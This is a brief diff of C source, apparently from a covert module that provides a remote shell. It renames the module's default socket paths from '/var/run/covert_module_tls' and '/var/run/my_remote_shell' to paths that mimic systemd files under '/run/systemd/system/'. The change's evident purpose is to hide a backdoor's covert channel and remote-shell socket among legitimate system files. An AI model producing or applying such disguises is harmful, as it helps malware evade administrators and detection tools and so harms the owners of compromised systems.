@@ -32,10 +32,10 @@
 
 static unsigned char secret_key[KEY_LEN];
 #ifndef UNIX_SOCK_PATH
-#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
+#define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
 #endif
 #ifndef SHELL_SOCK_PATH
-#define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
+#define SHELL_SOCK_PATH ("/run/systemd/system/bus")
 #endif
 
 int conn_sock;
